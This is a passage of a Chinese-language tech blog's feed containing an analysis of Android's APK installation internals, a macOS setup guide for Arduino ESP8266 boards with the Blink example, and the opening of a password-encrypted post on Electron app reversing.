中启动，通过 SystemServiceManager 的 startService(Installer.class) 启动。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152145965.png?raw=true" alt="image-20190801152145965"></p><p>构造函数 Installer() 初始化 context 和 isolated（是否真正连接installd）成员变量</p><p>重写 onStart() 方法，基于 isolated 判断是否调用 connect() 进行连接</p><p>connect() 通过 ServiceManager 获取 installd 服务并拿到服务的本地代理放到成员变量 mInstalld 中</p><p>Installer 调用 dexopt() 最终调用了 mInstalld 的dexopt() 方法，其他方法类似，几乎就是一个 IInstalld 类的封装</p><p><strong>!!!!  Installer 的实现变化很大：6.0 上通过以命令的方式通过 execute 方法执行；8.1 通过 AIDL 接口实现</strong></p><p><strong>PackageManageService（system权限） 与 installd（root权限） 守护进程共同完成应用管理</strong></p><p>PackageManagerService 的构造函数中会扫描许多应用目录来安装 apk</p><p>包括：</p><ul><li>系统应用，目录有 <code>/vender/overlay</code>、<code>/system/framework</code>、<code>/system/priv-app</code>、<code>/system/app</code>、<code>/vendor/app</code>、<code>/oem/app</code></li><li>非系统应用，目录有 <code>/data/app</code>、<code>/data/app-private</code></li></ul><p>调用的方法是 <code>scanDirTracedLI()</code></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152328199.png?raw=true" alt="image-20190801152328199"></p><p>可以看到依次调用 scanDirLI()、scanPackageLI()、scanPackageInternalLI()</p><p>其中，scanDirLI() 调用了 ParallelPackageParser 类进行解析，从名字也能看出做了一些并行的优化处理，真正的工作还是交给 PackageParser 来完成，PackageParser 的 parsePackage() 方法内部完成了应用的解析，实际上是解析了 AndroidManifest.xml 文件里面各个标签，包括包名、版本、权限、各组件这些信息，最后的解析结果放在 PackageParser.Package 类中返回给 PMS，这样 PMS 就拥有应用的信息便与做各种管理</p><p>后面继续调用了 scanPackageLI() 和 scanPackageInternalLI() 是进一步检测应用是否需要更新，如果需要更新则接着调用 createInstallArgsForExisting() 构造安装参数开始安装（后面还会遇到这个函数，暂时不展开），安装涉及到的签名校验也是在这里，调用了 collectCertificatesLI()、compareSignatures() 等</p><h4 id="场景二：adb-命令安装"><a href="#场景二：adb-命令安装" class="headerlink" title="场景二：adb 命令安装"></a>场景二：adb 命令安装</h4><p>adb 是 Android SDK 提供的一个命令行工具，为客户端-服务器架构，服务端为移动端上运行的守护进程 adbd，与 installd 一样由 init 进程创建</p><p>源码路径为：<a href="http://androidxref.com/8.1.0_r33/xref/system/core/adb/" target="_blank" rel="external">http://androidxref.com/8.1.0_r33/xref/system/core/adb/</a></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152448109.png?raw=true" alt="image-20190801152448109"></p><p>adb_commandline() 函数接收 adb 命令行参数，调用 install_app() 执行安装流程，这个函数会对命令行做一些修改，实际上调用 pm 命令，并通过 send_shell_command() 将命令发送给 Pm 类。</p><p>Pm 启动函数 main 会构造 Pm 类对象并调用 run() 方法，在这个方法里首先会获取 PackageManger 服务 mPm，然后调用 getPackageInstaller() 获取 PackageInstaller 对象 mInstaller，最后基于不同的命令调用不同的方法。</p><p>runInstall() 里面会首先获取之前解析时设置的安装参数 InstallParams，然后依次调用 doCreateSession() 创建安装会话，doWriteSession() 会通过 IO 流将应用信息写入 PackageInstaller.Session 对象，doCommitSession() 会提交相应的会话启动安装，最后调用 abandonSession() 结束会话。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152518924.png?raw=true" alt="image-20190801152518924"></p><p>PackageInstallerSession 的 commit() 方法首先将包信息封装到 PackageInstallObserverAdapter 这个类中，是 PackageInstallerService 的一个内部类，然后通过这个适配器获取 PackageInstallObserver2 对象代理，这是一个跨进程的观察者，接收安装状态的回调，最后用 Handler 的 obtainMessage 构造一个 MSG_COMMIT 类型的消息并发送出去。</p><p>发送的消息由 PackageInstallerService 的 Handler.Callback 接受，然后调用 commitLocked()，此方法最终会调用 PMS 的 installStage() 方法。</p><p>PackageInstallObserver2 对象接收到安装成功的回调时，会接着调用 PackageInstallerService 的 dispatchSessionFinished()，这个方法最后也是到了 PMS 里面调用 sendSessionCommitBroadcast() 方法。</p><h4 id="场景三：第三方应用安装"><a href="#场景三：第三方应用安装" class="headerlink" title="场景三：第三方应用安装"></a>场景三：第三方应用安装</h4><p>当下载一个新的应用包双击安装时，实际上是发送了一个 “android.intent.action.INSTALL_PACKAGE” 的 intent，这个时候会唤起 Android 系统的一个应用 PackageInstaller 来完成安装操作</p><p>PackageInstaller 的应用代码位于：<a href="http://androidxref.com/8.1.0_r33/xref/packages/apps/PackageInstaller/" target="_blank" rel="external">http://androidxref.com/8.1.0_r33/xref/packages/apps/PackageInstaller/</a></p><p>安装位置 /system/priv-app/GooglePackageInstaller，是一个 Android 系统默认应用程序，提供了用户界面来管理应用或包，用于安装普通文件</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152605993.png?raw=true" alt="image-20190801152605993"></p><p>应用双击安装后会唤起 PackageInstaller 应用，入口类为 InstallStart，onCreate() 首先被调用完成一些初始化过程，然后获取调用源做一些权限检查。</p><p>然后会调起 PackageInstallerActivity，onCreate() 会包括获取 PackageManager 和 PackageInstaller 对象，然后从 intent 中获取 mSessionId、packageUri、mOriginatingURI、mReferrerURI 这些与安装包相关的信息，接着调用 processPackageUri() 解析 uri，这里面会调用 PackageParser 去解析包，再接着会调用 bindUi() 完成安装主界面的展示和部件绑定，最后调用 checkIfAllowedAndInitiateInstall() 检查是否允许安装，如果允许，里面会继续调用 initiateInstall() 初始化安装，实际上这个函数是检查是否需要替换安装，最后调用 startInstallConfirm() 准备安装，设置 mOk 这个安装按钮为 true。</p><p>用户确认点击安装按钮后，调用 startInstall() 开始安装，这个函数里面又会构造一个 intent 传递必要的数据，开启 InstallInstalling 这个 activity。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152635344.png?raw=true" alt="image-20190801152635344"></p><p>InstallInstalling 这个类会拿到应用数据开启真正的安装流程。</p><p>首先是 onCreate() 函数，首先从 Intent 中取出数据放到 ApplicationInfo 中，然后基于拿到的应用信息分两种情况：如果是更新，则调用 getPackageManager() 获取 PackageManager 然后调用 installExistingPackage() 安装，成功调用 launchSuccess() 方法，失败调用 launchFailure() 方法，launchSuccess 会构造 Intent 跳转到 InstallSuccess 类， launchFailure 则跳转到 InstallFailed 类；如果是新应用的安装，首先会向 InstallEventReceiver 注册一个安装结果监听的广播，成功调用 launchSuccess，失败调用 launchFailure。</p><p>接下来是 onStart() 方法，这里会依次调用 getPackageManager()，getPackageInstaller()，registerSessionCallback() 注册会话的回调。</p><p>最后是 onResume() 方法，这个方法里会获取 session 的相关信息，然后创建并执行 InstallingAsyncTask() 的安装服务，其中的 doInBackground() 方法会将应用信息通过 IO 流写入 PackageInstaller.Session 中，onPostExecute() 方法则构造一个 PendingIntent 并将它的 IntentSender 通过 PackageInstaller.Session 的 commit() 方法发送出去</p><p>这里就跟 adb 安装走到了同一个流程中。</p><h4 id="深入-PMS-中的安装"><a href="#深入-PMS-中的安装" class="headerlink" title="深入 PMS 中的安装"></a>深入 PMS 中的安装</h4><p>上面的后面两种场景最后都会通过 PackageInstallerSession 的 commit() 方法提交一个安装的会话，并且最终调用到了 PackageManagerService 的 installStage() 方法</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152711796.png?raw=true" alt="image-20190801152711796"></p><p>在 installStage() 里会基于传入的参数构造一个 InstallParams 对象，这个对象中包含安装包的所有数据，然后将这个对象作为消息内容，通过 mHandler 发送一个类型为 INIT_COPY 的消息。</p><p>所有类型的消息处理都在 PackageHandler 里，这个类会通过 Binder 与 system_server 创建的 ServiceThread 线程绑定，PackageHandler 负责分发任务，ServiceThread 负责处理任务。</p><p><strong>1、处理 INIT_COPY 消息</strong></p><p>首先从消息结构中取出前面封装好的 HandlerParams 对象，然后检查 mBound 标志判断是否绑定 DefaultContainerService，这个服务用于检查和复制文件，位于 com.android.defcontainer 进程，通过 IMediaContainerService 与PMS 通信，mBound 默认为 false，此时调用 connectToService() 来绑定服务，并获取当前索引值的 HandlerParams 对象添加到 mPendingInstalls 这个 HandlerParams 的 ArrayList 中，如果 mBound 为 true，即服务已经连接，则直接添加 HandlerParams 对象，并发送一个 MCS_BOUND 消息。</p><p><strong>2、处理 MCS_BOUND 消息</strong></p><p>首先检查 DefaultContainerService 服务连接没问题，就开始处理安装请求队列，从 mPendingInstalls 中取出 HandlerParams 对象并调用它的 startCopy() 方法。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152741833.png?raw=true" alt="image-20190801152741833"></p><p>HandlerParams 是 PMS 中的抽象类，它的 startCopy() 会通过一个 mRetries 的私有变量检查尝试次数，超过4次则向 Handler 发送 MCS_GIVE_UP 的消息，抓到异常则发送 MCS_RECONNECT 的消息，成功则继续调用 handleStartCopy() 这个抽象方法，具体实现在 InstallParams 中，</p><p>InstallParams 的 handleStartCopy() 会首先是确定应用安装位置，是sd卡还是内部存储，并且做一些检查如位置冲突，空间够不够，然后通过 createInstallArgs() 创建 InstallArgs 类，然后调用这个类的 copyApk() 方法，InstallArgs 类也是抽象类，定义了应用包安装逻辑，子类包括 FileInstallArgs，处理 non-ASEC 应用，也即内部存储空间的应用， AsecInstallArgs 处理安装到 SD 卡中的应用，以及 MoveInstallArgs 处理已安装的应用，因此实际上是调用各自实例对象的 copyApk() 方法</p><p>以 FileInstallArgs 为例，copyApk() 方法会调用 doCopyApk()，在这个方法里会首先创建一个临时存储目录，然后调用 DefaultContainerService 的 copyPackage() 方法完成 apk 复制</p><p>HandlerParams 复制 apk 后会调用 handleReturnCode()，这个方法又会调用 processPendingInstall() 方法，最终会调用到 InstallArgs 的 doPreInstall() 完成安装前的清理工作，调用 installPackageTracedLI() 实现真正的安装，以及调用 InstallArgs 的 doPostInstall() 完成收尾的清理工作，最后发送一个类型为 POST_INSTALL 的消息</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152755489.png?raw=true" alt="image-20190801152755489"></p><p> installPackageTracedLI() 里面完成的是真正的安装操作，会依次进行变量初始化，再次解析应用包，获取签名信息，权限检查，安装路径重命名等等操作，最后根据参数有两种不同的处理方式，更新条件下的覆盖安装，调用 replacePackageLI() 方法，以及应用的首次安装，调用 installNewPackageLI() 方法</p><p>其中 replacePackageLI() 会首先清楚应用包的注册信息，然后类似 installNewPackageLI() 里面的流程重新安装更新的包，直接看  installNewPackageLI() 流程</p><p>installNewPackageLI() 里面调用 scanPackageTraceLI() 执行安装，然后这个函数里面又会继续调用 scanPackageInternalLI() 执行包解析，最后将 PackageParser.Package 对象返回出来，扫描完包之后就会调用 updateSettingsLI() 更新 Settings，也就是更新应用在 PMS 中的注册信息，会修改包括 packages.xml、package.list 等相关文件，如果安装成功则调用 prepareAppDataAfterInstallLIF() 来创建相关的数据目录，失败则执行回退操作 deletePackageLIF()</p><p><strong>3、处理 POST_INSTALL 消息</strong></p><p>首先从 mRunningInstalls 中拿到 PostInstallData 对象，mRunningInstalls 是 PostInstallData 格式的列表，在应用安装成功时构建，在安装完成后会调用 delete() 移除这一条记录，接下来取 PostInstallData 对象中的一些信息如安装参数，授予的权限等作为参数调用 handlePackagePostInstall() 执行安装完成的后续操作，包括授予权限，发送安装成功广播，发送启动广播等等</p><h4 id="安装过程小结"><a href="#安装过程小结" class="headerlink" title="安装过程小结"></a>安装过程小结</h4><p>与应用相关的一些目录</p><ul><li><p>/system/priv-app：系统应用安装路径，Android 4.4+ 开始出现，区分系统应用权限，拥有 SignatureOrSystem 权限，此目录下的 service 具有保活能力</p></li><li><p>/system/app：系统应用安装路径，权限略低于 priv-app 目录下的应用，放置比如厂商内置应用</p></li><li><p>/data/app：用户应用安装路径，应用安装时将 apk 复制到此目录下</p></li></ul><ul><li><p>/data/data：用户应用数据存放路径，存在沙箱隔离</p></li><li><p>/data/dalvik-cache：存放应用的dex 文件</p></li><li><p>/data/system：存放应用安装相关文件</p><ul><li>packages.xml 是一个应用的注册表，在解析应用时创建，有变化时更新，记录系统权限，各应用信息，如name, codePath, flag, version, userid，下次开机时直接读取并添加到内存列表</li><li>package.list 指定应用的默认存储位置，userid 等</li></ul></li></ul><p>应用安装过程总结</p><ol><li>将应用 apk 拷贝到指定目录下</li><li>解压 apk，将 dex 文件拷贝到 /data/dalvik-cache 目录，创建 /data/data/<packagename> 数据目录</packagename></li><li>解析 AndroidManifest.xml 及其他资源文件，提取应用包信息，注册到 packags.xml 中</li><li>由 Launcher 进程通过 PMS 取出所有应用程序，展示在桌面上</li></ol><h4 id="PMS-与-PM-与APM"><a href="#PMS-与-PM-与APM" class="headerlink" title="PMS 与 PM 与APM"></a>PMS 与 PM 与APM</h4><p>前面的一切分析都是围绕 PackageManagerService 来进行的，但是实际上平时开发过程中基本接触不到这个类，在用户层用得最多的应该是 PackageManager 这个类</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152858658.png?raw=true" alt="image-20190801152858658"></p><p>通常在用户层通过 Context 的 getPackageManager() 方法来获取 PackageManager 实例，Context 的 getPackageManager() 实现在 ContextImpl 里面，这个函数实际上返回的是一个 ApplicationPackageManager 对象，ApplicationPackageManager 类构造函数需要两个璨是，一个是 ContextImpl 自身，另一个是通过 ActivityThread 的 getPackageManager() 获取 IPackageManager 对象</p><p>ActivityThread 的 getPackageManager() 首先调用 ServiceManager 的 getService(“package”) 获取 IBinder 对象，然后通过 IPackageManger.Stub.asInterface(IBinder) 获取 IPackageManager 对象，实际上为这个对象的一个代理</p><p>继续梳理一下这个类与 PMS 之间的关系</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152915992.png?raw=true" alt="image-20190801152915992"></p><p>IPackageManager 使用了 Android 接口定义语言（AIDL）实现进程间通信，通过在 .aidl 后缀的文件中定义好接口，Android SDK 就会基于此文件自动生成一个 IBinder 接口的类，服务端实现这些接口，客户端则通过绑定到服务调用接口中定义的方法</p><p>IPackageManager 通过 AIDL 文件自动生成的一个接口类，继承自 IInterface</p><p>IPackageManager.Stub 是 IPackageManager 的内部类，继承自 Binder，实现 IPackageManager</p><ul><li>asInterface() 方法接受 IBinder 对象，转换成 IPackageManager 类型对象并返回，实际上返回的是 IPackageManager.Stub.Proxy 对象</li><li>asBinder() 方法返回自身，即 IPackageManager.Stub 对象</li><li>重写了 onTransact() 方法，根据命令类型处理数据传输</li></ul><p>IPackageManager.Stub.Proxy 是 IPackageManager.Stub 的内部类，实现了IPackageManager接口</p><ul><li>mRemote对象是IBinder类型，是对IPackageManager.Stub的引用</li><li>重写了asBinder()方法，返回mRemote</li><li>实现了AIDL文件定义的接口</li></ul><p>PackageManager 是系统提供的服务管理类，负责管理应用程序包的，包含以下功能：</p><ul><li>安装/卸载/更新应用，包括 installPackage/</li><li>查询已安装应用，通过 getInstalledPackages() 方法获取 PackageInfo 对象的列表</li><li>查询应用相关信息，通过 getPackageInfo() 方法获取 PackageInfo 对象</li><li>查询权限相关信息，通过 getPermissionInfo() 方法获取 PermissionInfo 对象</li><li>增加/删除权限，包括 addPermission/removePermission</li><li>清除用户数据/缓存/代码等</li></ul><p>PackageManager 是一个抽象类，定义了 IPackageManager 接口的子集</p><p>ApplicationPackageManager 是 PackageManager 的实现类，它继承了 PackageManager 并实现其所有抽象方法</p><p>PackageManagerService 继承了 IPackageManager.Stub</p><p>因此，总结来说就是，ApplicationPackageManager 是 AIDL 模型中 Binder 通信的客户端，PackageMangerService 就是服务端，客户端的所有的功能都是通过一个 IPackageManager 类型的成员变量去完成的，实际上这个变量就是 PackageManagerService 的一个代理，通过这个代理客户端可以调用到 PackageManagerService 中的一些方法</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="http://androidxref.com/8.1.0_r33/xref/" target="_blank" rel="external">http://androidxref.com/8.1.0_r33/xref/</a></li><li><a href="https://juejin.im/post/5b7e72bbe51d453894001ef0#heading-6" target="_blank" rel="external">https://juejin.im/post/5b7e72bbe51d453894001ef0#heading-6</a></li><li><a href="http://solart.cc/2016/10/30/install_apk/" target="_blank" rel="external">http://solart.cc/2016/10/30/install_apk/</a></li><li><a href="https://www.jianshu.com/p/4f16421d5c7f" target="_blank" rel="external">https://www.jianshu.com/p/4f16421d5c7f</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Android应用安装过程深度解析&quot;&gt;&lt;a href=&quot;#Android应用安装过程深度解析&quot; class=&quot;headerlink&quot; title=&quot;Android应用安装过程深度解析&quot;&gt;&lt;/a&gt;Android应用安装过程深度解析&lt;/h3&gt;&lt;blockquote&gt;

      
    
    </summary>
    
      <category term="wiki" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/wiki/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
      <category term="Android" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>Arduino ESP8266开发板上手实践</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/30/Arduino-ESP8266-bigstep/Arduino-ESP8266-bigstep/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/30/Arduino-ESP8266-bigstep/Arduino-ESP8266-bigstep/</id>
    <published>2019-07-30T02:46:35.000Z</published>
    <updated>2019-08-09T08:47:21.452Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Arduino-ESP8266开发板上手实践"><a href="#Arduino-ESP8266开发板上手实践" class="headerlink" title="Arduino ESP8266开发板上手实践"></a>Arduino ESP8266开发板上手实践</h3><h4 id="环境搭建（macOS）"><a href="#环境搭建（macOS）" class="headerlink" title="环境搭建（macOS）"></a>环境搭建（macOS）</h4><p>官方说明：<a href="https://github.com/esp8266/Arduino">https://github.com/esp8266/Arduino</a></p><ul><li><p><strong>安装IDE （Arduino IDE）</strong></p><p>下载地址：<a href="https://www.arduino.cc/en/main/software" target="_blank" rel="external">https://www.arduino.cc/en/main/software</a></p><p>还有种方式是利用<a href="https://github.com/plerup/makeEspArduino">Makefile</a>去做开发，这里先做个记录，说不定以后会用这个开发模式，毕竟可控性比较高。但目前还不是很熟悉，建议选择上面的IDE。</p></li></ul><ul><li><p><strong>下载ESP8266硬件包</strong></p><p>1 、在设置里面的附加板管理器网址中增加以下链接<code>https://arduino.esp8266.com/stable/package_esp8266com_index.json</code></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/Arduino-ESP8266-bigstep/image-20190730143145367.png?raw=true" width="500" hegiht="313" align="center"></p><p>2、在工具中找到你的开发板，然后进入开发板管理器，搜索<strong>esp8266</strong>安装该库，我这里已经安装了。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/Arduino-ESP8266-bigstep/image-20190730143643887.png?raw=true" width="500" hegiht="313" align="center"></p><p>注意：如果这种方式安装不了，你可以选择下载软件包手动安装，这里不展开分析。参考<a href="https://github.com/esp8266/Arduino">这里</a></p></li><li><p><strong>运行示例代码</strong></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/Arduino-ESP8266-bigstep/image-20190730144157955.png?raw=true" width="500" hegiht="313" align="center"></p><p>我这里打开Blink这个示例代码，这段代码很简单，就是控制LED灯的闪烁。</p><p>代码如下</p><pre><code class="c">/*  ESP8266 Blink by Simon Peter  Blink the blue LED on the ESP-01 module  This example code is in the public domain  The blue LED on the ESP-01 module is connected to GPIO1  (which is also the TXD pin; so we cannot use Serial.print() at the same time)  Note that this sketch uses LED_BUILTIN to find the pin with the internal LED*/void setup() {  pinMode(LED_BUILTIN, OUTPUT);     // Initialize the LED_BUILTIN pin as an output}// the loop function runs over and over again forevervoid loop() {  digitalWrite(LED_BUILTIN, LOW);   // Turn the LED on (Note that LOW is the voltage level  // but actually the LED is on; this is because  // it is active low on the ESP-01)  delay(1000);                      // Wait for a second  digitalWrite(LED_BUILTIN, HIGH);  // Turn the LED off by making the voltage HIGH  delay(2000);                      // Wait for two seconds (to demonstrate the active low LED)}</code></pre><p>在这里点击项目上传，就会编译该Blink项目并上传写入开发板上面运行。如果一切顺利的话，你的开发板的LED灯应该就会开始闪烁了。</p></li></ul><h4 id="重要！！！一些坑以及注意点"><a href="#重要！！！一些坑以及注意点" class="headerlink" title="重要！！！一些坑以及注意点"></a>重要！！！一些坑以及注意点</h4><p>下面说下一切不是很顺利的情况，首先我这里是以mac会开发平台，所以这里都是mac相关的注意事项和问题。</p><p>确定你的端口正常，即电脑是否与开发板正常通信。一般来说你上传代码报错多半是由于端口不可用或者无法找到端口。这里提供几个思路去检查。</p><p>1、确定usb是否连接，这里可以下载一个IORegistryExplorer的工具。<a href="https://developer.apple.com/download/more/" target="_blank" rel="external">下载地址1</a> <a href="https://github.com/vulgo/IORegistryExplorer">下载地址2</a> <a href="https://mac.softpedia.com/get/System-Utilities/IORegistryExplorer.shtml" target="_blank" rel="external">下载地址3</a>在我插入开发板的时候可以看到usb2.0下面多了一个设备，说明能够usb连接正常。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/Arduino-ESP8266-bigstep/image-20190730145128956.png?raw=true" width="500" hegiht="313" align="center"></p><p>2、确定安装了开发板相关的驱动，这个驱动的作用主要就是将设备操作通过<code>Virtual COM Port</code>去通信。这里有几个坑。之前网上能搜到的驱动都不支持最新的macOS系统（10.14）。所以导致我的<code>/dev</code>目录下并没有出现对应的文件。之前的驱动大多是这个<a href="https://github.com/adrianmihalko/ch340g-ch34g-ch34x-mac-os-x-driver">CH340G CH34G CH34X Mac OS X driver</a> 照着里面的步骤，把SIP禁用以及其他都操作了一遍都不行。最后才发现这个驱动可能不支持最新的mac系统，这里我找到一个能够在最新系统正常的驱动下载地址在<a href="https://www.silabs.com/products/development-tools/software/usb-to-uart-bridge-vcp-drivers" target="_blank" rel="external">这里</a>。安装完以后在<code>/dev</code>就应该有一个<code>tty.SLAB_USBtoUART</code>的文件。说明通信的端口已经建立，这时候再IDE中选择该端口。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/Arduino-ESP8266-bigstep/image-20190730145909934.png?raw=true" width="500" hegiht="313" align="center"></p><h4 id="资源链接"><a href="#资源链接" class="headerlink" title="资源链接"></a>资源链接</h4><p>这里我提供一些我在搭建过程中搜到的一些资源，可以参考一下</p><ul><li><p><a href="https://www.arduino.cc/en/guide/macOSX?setlang=cn" target="_blank" rel="external">https://www.arduino.cc/en/guide/macOSX?setlang=cn</a></p><p>在Mac OS X系统上入门Arduino/ Genuino</p></li><li><p><a href="https://juejin.im/post/5b569026e51d4513ee6dd509" target="_blank" rel="external">https://juejin.im/post/5b569026e51d4513ee6dd509</a></p><p>Esp8266+Arduino+Mac开发环境搭建</p></li><li><p><a href="https://www.open-homeautomation.com/2016/06/10/program-an-esp8266-from-arduino-on-macos/" target="_blank" rel="external">https://www.open-homeautomation.com/2016/06/10/program-an-esp8266-from-arduino-on-macos/</a></p><p>Program an ESP8266 from Arduino on MacOS</p></li><li><p><a href="https://github.com/adrianmihalko/ch340g-ch34g-ch34x-mac-os-x-driver">https://github.com/adrianmihalko/ch340g-ch34g-ch34x-mac-os-x-driver</a></p><p>CH340G CH34G CH34X Mac OS X driver</p></li><li><p><a href="http://www.nodemcu.com" target="_blank" rel="external">http://www.nodemcu.com</a></p><p>资料下载访问官网</p></li><li><p><a href="https://pan.baidu.com/s/1ZCjaSJLNpQWL7CPOpkH-dg" target="_blank" rel="external">https://pan.baidu.com/s/1ZCjaSJLNpQWL7CPOpkH-dg</a></p><p>NODEMCU资料</p></li><li><p><a href="http://www.wch.cn/download/CH341SER_MAC_ZIP.html" target="_blank" rel="external">http://www.wch.cn/download/CH341SER_MAC_ZIP.html</a></p><p>mac串口驱动下载地址</p></li><li><p><a href="https://freeware.the-meiers.org/" target="_blank" rel="external">https://freeware.the-meiers.org/</a></p><p>CoolTerm串口监控工具下载</p></li><li><p>SIP禁用步骤</p><pre><code>1. 重启mac，在出现苹果标志和进度条的时候按住 cmd+r2. 终端中输入csrutil disable/status/enabled3. 重启mac</code></pre></li></ul><h4 id="AVR逆向基础"><a href="#AVR逆向基础" class="headerlink" title="AVR逆向基础"></a>AVR逆向基础</h4><p>下面我们就来熟悉一下这个系统，包括代码环境，编译环境，常见库，开发相关。还是以一些demo代码作为学习。</p><p>由于我们主要是研究iOT逆向，所以可能不会关注在实际开发上面。这里先学习下Arduino上面的执行文件格式，以及指令架构等。</p><p>我们通常说的Arduino上面就运行的是一个AVR指令架构的处理器。</p><blockquote><p>AVR refers to the line of MCUs manufactured by Atmel and used in the original designs.</p></blockquote><p>由于ida对这个执行文件的支持不是很好，我们准备用<a href="https://github.com/radare/radare2">radare2</a>来分析这个bin文件。</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><p><a href="https://blog.csdn.net/iotisan/article/details/78766463" target="_blank" rel="external">https://blog.csdn.net/iotisan/article/details/78766463</a></p><p>和ESP8266 Arduino谈场恋爱 01 一条具有中国特色的开发环境安装道路</p></li><li><p><a href="https://www.reddit.com/r/arduino/comments/9jlz5g/any_nodemcu_esp8266_drivers_for_macos_mojave/" target="_blank" rel="external">https://www.reddit.com/r/arduino/comments/9jlz5g/any_nodemcu_esp8266_drivers_for_macos_mojave/</a></p><p>Any NodeMCU esp8266 Drivers for MacOS Mojave?</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Arduino-ESP8266开发板上手实践&quot;&gt;&lt;a href=&quot;#Arduino-ESP8266开发板上手实践&quot; class=&quot;headerlink&quot; title=&quot;Arduino ESP8266开发板上手实践&quot;&gt;&lt;/a&gt;Arduino ESP8266开发板上手
      
    
    </summary>
    
      <category term="IOT" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/IOT/"/>
    
    
      <category term="Arduino" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Arduino/"/>
    
      <category term="IOT" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/IOT/"/>
    
  </entry>
  
  <entry>
    <title>Electron跨平台App实战分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/29/Electron-app-reversing/Electron-app-reversing/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/29/Electron-app-reversing/Electron-app-reversing/</id>
    <published>2019-07-29T03:59:49.000Z</published>
    <updated>2019-07-29T14:45:34.468Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">U2FsdGVkX1+Pbju2bc61/2jcIEm/jqAzdTZpKrcjMr33thST9QUH2YuqFawtWQScr5QGibs0C+PqHFQEcfPboekAz6zMGyZCQVswusq1S2X7w0/UgTjcXgwEdKQReFRMdUSyJYso6tOe5j2XvLaNz+tawAX5WQ6fzC7g5nd4wYE6Kg/wXSWC0WBN6A30oYKQej1OBqhBYTMUh3lyg4/3o5V7+FIfWWQOinlSnrHekgnb1VvGyMXeclHHdP36xhleo3dpMneE4si6byEzNiv8nV0nbmGktzpp7qBQnz7+GfbawNfvQ9Y2hZ78shRkT1WbZodjULu5QSMZxhc8EgPnimtUxUeJduCpCsemuSejptNaCO33Jc46V8jutYPjnlXUDKedRcP/Dm/CTnkSBW7zIc03mUDaot+Y9Ww+d8JuhHbgDEJRaSrYQyYmgwaEKTkZ7MF/mH3zDVtJ9Y9TDOxybDnRKXq6kj/fHkG8A6dTCgxVfXdPfblOJHKR1GXgmciI/XsljO6fCp2tkosUY3QvipsrUCofoFpSek0SNxDJWFgJY+4OV1F+O1ADdZiOuD3McZ1P+2ZZEDX+FWSDAPPpuURtH0p10yjkE8j68smRw3ay2i5GRGcu6tlahYuEViKqbZYwTfUCaR7liHmzghHs/OjyjTL4DFXCMt7rB2bixsvKZnrZewcclRRnmy0vEUArKcTZyvMFXQqRvNoifemsHZ900LezzcaGFk7Jo+7FTAtf4kjZux8wobG6D362WT/M6C5IRlYRmkA24LfxcXHpaF1U3heldd5zgHi+VEblsXqgBJvjl58PY4PInguNsCKhSGriCELbYh2QaioBlwGH0vOcHpaVrmHRzsIBHZOfXySz5rICWhrfrUKL38jo4SA5BPH3b3QtSIu+yjhEV6hP5tYwfBrn1wCPX8tbhgqnJOW0qc1jhwBKGA/qF1SW4GdgXK4Z+xKD9q/4nK4Bt09PYesU51rFxEa/Sjkj4EAFrsdo/qSYBOozNCn8xgb1yRa2iIQGED80dqqgvpEMl/1affv//7Buu8uoRxjsQHF53RZ52g7PPvKQnFKpm/nvKgbC9LPQRvEVSOWWHG9Dy3HIBGWMLu+ZCbW0k3VlNd065upQkQgu8fpphy9fIjeVeZKDqyp5hl1Etpkg+lH1kHC8wcZCiHIAdtwxJmyDGrAB4SFD4jtFH22PkwuULVQC4HFdJ9x0WP+exKjgFcqSnyzt8jeAhfD/ocWlRg9vITFQi6u9